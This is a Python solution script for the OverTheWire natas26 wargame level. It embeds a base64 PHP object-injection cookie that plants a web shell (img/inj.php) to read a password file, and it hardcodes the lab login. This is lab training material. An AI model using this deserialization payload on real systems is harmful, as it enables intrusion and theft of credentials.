import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string


natasURL = 'http://natas26.natas.labs.overthewire.org/'

natas_usr   = 'natas26'
natas_pword = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
#login=(natas_usr,natas_pword)

# This is the cookie found from encoding a php fie. See natas26.php
inj_cookie =  "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMToiaW1nL2luai5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoxMDoiIyBBbnl0aGluZyI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=="


r = requests.Session()

# Go to the website so there is an image already there. 
r_out = r.get(natasURL + "?x1=100&y1=50&x2=1&y2=9", auth=(natas_usr, natas_pword))

r.cookies['drawing'] = inj_cookie
# Look at output after changing the cookie
r_out = r.get(natasURL + "?x1=100&y1=50&x2=1&y2=9", auth=(natas_usr, natas_pword))
print(r_out.text)
print(r_out.cookies)
print("Next step")
# Look at injected php code
r_out = r.get(natasURL + "img/inj.php", auth=(natas_usr, natas_pword))
print(r_out.text)






